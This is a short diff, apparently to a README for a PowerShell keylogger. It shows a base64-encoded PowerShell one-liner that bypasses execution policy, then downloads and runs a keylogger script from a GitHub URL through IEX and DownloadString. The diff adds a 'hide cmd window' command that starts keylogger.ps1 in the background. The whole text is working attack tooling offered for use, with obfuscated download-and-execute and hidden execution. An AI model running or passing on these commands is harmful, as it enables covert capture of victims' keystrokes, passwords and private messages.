@@ -6,3 +6,5 @@ powershell.exe -NoProfile -ExecutionPolicy bypass -NoExit -Enc SQBFAFgAIAAoAE4AZ
 ```
 powershell.exe -NoProfile -ExecutionPolicy bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AbABoAGwAdwBkAGcALwBrAGUAeQBsAG8AZwBnAGUAcgAvAG0AYQBzAHQAZQByAC8ASwBlAHkAbABvAGcAZwBlAHIAMwAuAHAAcwAxACcAKQA=
 ```
+### hide cmd window
+start "" /b powershell.exe -nop -exec bypass keylogger.ps1
